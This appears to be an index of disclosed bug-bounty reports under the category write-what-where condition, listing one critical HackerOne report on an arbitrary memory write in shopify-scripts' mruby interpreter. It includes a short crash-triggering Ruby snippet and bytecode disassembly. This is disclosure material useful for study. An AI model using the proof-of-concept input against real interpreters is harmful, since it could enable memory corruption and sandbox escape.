# Write-what-where Condition

_1 reports — High/Critical, disclosed_

- **OP_SCALL in LHS of a OP_ASGN resulting in arbitrary memory write** — `shopify-scripts` · `Critical` [↗](https://hackerone.com/reports/226200)
  - x = 0x4242422a a = *(_&.__=0) a = *(_&.__=0) irep 0x60c000014440 nregs=5 nlocals=3 pools=1 syms=0 reps=0 file: crashes/b.rb 3 000 OP_LOADL R1 L(0) ; 1111638570 ; R1:x 4 001 OP_ARRAY R3 R3 0 4 002 OP_LOADI R4 0 4 003 OP_ARYCAT R2 R3 ; R2:a 5 004 OP_ARRAY R2 R2 0 ; R2:a R2:a 5 005
